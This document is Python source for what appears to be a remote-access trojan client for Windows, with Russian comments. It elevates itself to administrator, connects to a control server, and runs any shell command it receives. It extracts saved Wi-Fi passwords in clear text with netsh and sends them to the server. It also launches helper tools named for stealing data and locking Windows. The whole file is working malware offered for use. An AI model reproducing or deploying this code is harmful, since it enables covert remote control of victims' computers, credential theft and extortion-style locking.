import socket
import subprocess
import requests
import ctypes
import sys
import os
import tkinter as tk
from tkinter import scrolledtext
import threading
import re
import json
import locale

kernel32 = ctypes.windll.kernel32

def is_admin():
    """Проверяет, запущен ли скрипт с правами администратора"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_wifi_passwords():
    """Улучшенная функция получения Wi-Fi паролей на клиенте"""
    try:
        # Проверка прав администратора
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return {"error": "Требуются права администратора на клиенте"}

        # Проверка Wi-Fi адаптера
        interface_check = subprocess.run(
            ['netsh', 'interface', 'show', 'interface'],
            capture_output=True,
            text=True,
            encoding='cp866',
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if not any(x in interface_check.stdout for x in ["Wireless", "Беспроводная"]):
            return {"error": "Wi-Fi адаптер не активен на клиенте"}

        # Получаем профили
        profiles_output = subprocess.run(
            ['netsh', 'wlan', 'show', 'profiles'],
            capture_output=True,
            text=True,
            encoding='cp866',
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        if profiles_output.returncode != 0:
            return {"error": "Ошибка при получении профилей Wi-Fi"}

        # Универсальный парсинг для любого языка
        profiles = []
        for line in profiles_output.stdout.split('\n'):
            if "All User Profile" in line or "Все профили пользователей" in line:
                profile = line.split(':')[-1].strip()
                if profile:
                    profiles.append(profile)

        if not profiles:
            return {"error": "Нет сохраненных Wi-Fi сетей на клиенте"}

        # Получаем пароли
        wifi_data = {}
        for profile in profiles:
            try:
                safe_profile = f'"{profile}"' if ' ' in profile else profile
                
                password_output = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', safe_profile, 'key=clear'],
                    capture_output=True,
                    text=True,
                    encoding='cp866',
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    timeout=15
                )

                if password_output.returncode == 0:
                    key_line = [l for l in password_output.stdout.split('\n') 
                              if "Key Content" in l or "Содержимое ключа" in l]
                    password = key_line[0].split(':')[-1].strip() if key_line else "Пароль не сохранен"
                    wifi_data[profile] = password
                else:
                    wifi_data[profile] = "Не удалось получить пароль"
            except Exception as e:
                wifi_data[profile] = f"Ошибка: {str(e)}"
                continue

        return wifi_data if wifi_data else {"error": "Не удалось извлечь пароли"}

    except Exception as e:
        return {"error": f"Системная ошибка на клиенте: {str(e)}"}

def start_client(server_ip, server_port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((server_ip, server_port))
        print(f"[*] Подключено к {server_ip}:{server_port}")

        while True:
            try:
                command = client.recv(4096).decode().strip()
                if not command:
                    continue

                print(f"[Получена команда]: {command}")

                if command.lower() == "exit":
                    break

                # Обработка команды getwifi
                if command.lower() == "getwifi":
                    wifi_data = get_wifi_passwords()
                    client.send(json.dumps(wifi_data, ensure_ascii=False).encode('utf-8'))
                    continue

                # Обработка других команд
                response = handle_command(command)
                client.send(response.encode())

            except Exception as e:
                print(f"[!] Ошибка обработки команды: {str(e)}")
                client.send(f"Ошибка: {str(e)}".encode())

    except Exception as e:
        print(f"[!] Ошибка соединения: {str(e)}")
    finally:
        client.close()
        print("[*] Соединение закрыто")

def handle_command(command):
    """Обрабатывает все входящие команды"""
    try:
        if command.lower() == "getid":
            try:
                r = requests.get("https://api.example.com/info", timeout=5)
                return r.text
            except Exception as e:
                return f"Ошибка: {str(e)}"

        # Обработка инструментов
        tool_commands = {
            "extool": "extool.py",
            "winlock": "fslocker.py",
            "steal": "thesteal.py",
            "web": "web.py",
            "demo": "demo.py",
            "micro": "micro.py",
            "chat": start_client_chat
        }
        
        for prefix, handler in tool_commands.items():
            if command.lower().startswith(prefix):
                if prefix == "chat":
                    return "Используйте команду chat напрямую"
                
                tool_path = os.path.join(os.path.dirname(__file__), 'tools', handler)
                args = command.split()[1:] if ' ' in command else []
                
                try:
                    result = subprocess.run(
                        ['python', tool_path] + args,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    return result.stdout if result.returncode == 0 else result.stderr
                except Exception as e:
                    return f"Ошибка инструмента: {str(e)}"

        # Обработка обычных команд
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60
        )
        return result.stdout if result.returncode == 0 else result.stderr

    except Exception as e:
        return f"Ошибка выполнения команды: {str(e)}"

def start_client_chat(client_socket):
    """Запускает чат-интерфейс"""
    def receive_messages():
        while True:
            try:
                message = client_socket.recv(4096).decode()
                if not message:
                    break
                chat_text.insert(tk.END, f"[Сервер]: {message}\n")
                chat_text.see(tk.END)
            except (ConnectionResetError, BrokenPipeError):
                break

    root = tk.Tk()
    root.title("Клиентский чат")
    root.geometry("500x400")
    root.protocol("WM_DELETE_WINDOW", lambda: root.quit())

    chat_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=60, height=20)
    chat_text.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

    input_frame = tk.Frame(root)
    input_frame.pack(padx=10, pady=5, fill=tk.X)

    entry = tk.Entry(input_frame, width=50)
    entry.pack(side=tk.LEFT, fill=tk.X, expand=True)

    def send_message():
        message = entry.get()
        if message:
            chat_text.insert(tk.END, f"[Вы]: {message}\n")
            chat_text.see(tk.END)
            client_socket.send(message.encode())
            entry.delete(0, tk.END)

    send_btn = tk.Button(input_frame, text="Отправить", command=send_message)
    send_btn.pack(side=tk.RIGHT, padx=5)
    entry.bind("<Return>", lambda e: send_message())

    threading.Thread(target=receive_messages, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    if not is_admin():
        print("Требуются права администратора!")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    SERVER_IP = "127.0.0.1"
    SERVER_PORT = 5555

    try:
        start_client(SERVER_IP, SERVER_PORT)
    except KeyboardInterrupt:
        print("\nКлиент завершен")
        sys.exit(0)